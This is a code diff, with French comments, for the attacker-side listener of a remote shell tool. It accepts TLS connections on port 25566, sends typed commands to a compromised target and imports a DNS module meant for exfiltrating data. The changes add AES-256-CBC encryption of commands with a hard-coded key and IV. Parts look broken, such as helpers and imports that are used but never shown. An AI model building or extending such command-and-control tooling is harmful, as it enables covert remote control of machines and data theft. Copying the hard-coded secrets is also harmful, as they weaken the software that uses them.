@@ -5,9 +5,9 @@
 # import des libraires
 import socket       # communication entre l'attaque et la cible
 import ssl
+import os
 import threading          # chiffrement des échanges
 from dns_server import *
-#import dns_server   # exfiltration des données via DNS
 
 # en écoute sur toutes les connexions entrantes
 # 0.0.0.0:25566
@@ -18,6 +18,11 @@ CERTIFICATE = "./chiffrement/python_ssl.pem"
 KEY = "./chiffrement/python_ssl_priv.key"
 # taille des messages : 128kB max
 BUFFER_SIZE = 1024 * 128
+
+# clé de 32 octets pour utiliser AES-256 CBC
+AES_KEY = b'W3c9vlwl1Cj0tM6FHkh3pZ%OTc+x8ET='
+# vecteur initial de 16 octets
+IV = b'efd6cb512023b721'
 
 # Créer une socket TCP/IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,7 +36,7 @@ context.load_cert_chain(certfile=CERTIFICATE, keyfile=KEY)
 
 #à mettre dans une fonction
 def shell(sock):
-    while True:
+    while sock:
         print(f"[*] Listening to {HOST}:{PORT}...")
         conn, addr = sock.accept()
 
@@ -50,6 +55,7 @@ def shell(sock):
                     sock.close()
                     conn.close()
                     exit(0)
+                command = encrypt_aes_cbc(AES_KEY, IV, command)
                 connssl.sendall(command.encode())
                 time.sleep(1)
                 print("")
@@ -66,6 +72,13 @@ def shell(sock):
             exit(0)
 
 if __name__ == "__main__":
+    # OS Windows
+    if os.name == 'nt':
+        windows = os.system('cls')
+
+    # OS UNIX
+    else:
+        unix = os.system('clear')
     thread_shell = threading.Thread(target=shell, args=[sock])
     thread_shell.start()
     #thread_shell.join()
